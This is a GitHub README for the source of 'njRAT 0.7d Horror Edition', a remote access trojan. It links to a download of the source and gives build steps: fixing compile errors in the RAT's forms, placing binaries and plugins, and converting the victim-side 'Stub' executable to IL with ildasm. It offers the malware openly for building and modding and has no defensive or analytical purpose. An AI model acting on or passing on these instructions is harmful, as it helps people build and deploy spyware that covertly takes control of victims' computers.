# SOURCE-CODE-njRAT-0.7d-Horror-Edition

 njRAT 0.7d Horror Edition - SRC is in RAR file because github not allow upload more than 100 file at once
 downlaod from here: https://github.com/De-eloper/SOURCE-CODE-njRAT-0.7d-Horror-Edition/archive/refs/heads/main.zip
 

before editing or opening code/forms in the njRAT 0.7d Horror Edition - SRC, compile in release mode!
you will run into unfixable errors if you do not do that first!

if you edit form1 or maybe some the forms  and try to compile you may run to errors like:
Type 'NJRAT.L1' is not defined
Type 'NJRAT.Pp1' is not defined
Type 'NJRAT.Gclass9' is not defined

this happen in compileing, to fix ther error and use normally again edit it:

FROM 
        Me.L1 = New NJRAT.L1()
        Me.Pp1 = New NJRAT.Pp1()

TO
        Me.L1 = New L1()
        Me.Pp1 = New Pp1()

Remove the "NJRAT." and the erorr will go away and not break the rat
if you do it wrong the notf form will never show up (no notification working)

When you build it the solutions, move the bins to  njRAT 0.7d Horror Edition - BIN
then your mod will function, it cannot work in a single exe mode.

if you builde a new plugin, move it to the   njRAT 0.7d Horror Edition - BIN
plugins folder, and replace them with your new one.

IF YOU RUN INTO ERROR Please Open an Issue in github. i can try to fix or show
how to add new feature or more.

# Stub to .IL file

you need visual studio developer command prompt. check/search for:

VsDevCmd.bat
or
Developer Command Prompt

if not found serach google or where to find the dev prompt cmd.
TO convert the stub, you need to do 1 cmd.

example command...

ildasm.exe "C:\src release\njRAT 0.7d Horror Edition Stub - SRC\obj\x86\Release\Stub.exe" /out="C:\src release\njRAT 0.7d Horror Edition Stub - SRC\obj\x86\Release\Stub.il"

like that:
ildasm.exe "(path your .exe)" /out="(path your Stub.il)"

if you want to quickly get the path type like: "ildasm.exe(space)" and drag the stub.exe to the cmd, it gets the path with qoute marks "(space)/out=" then drag stub.exe back to the cmd. and full paths was done fast

need more or video? please open issue
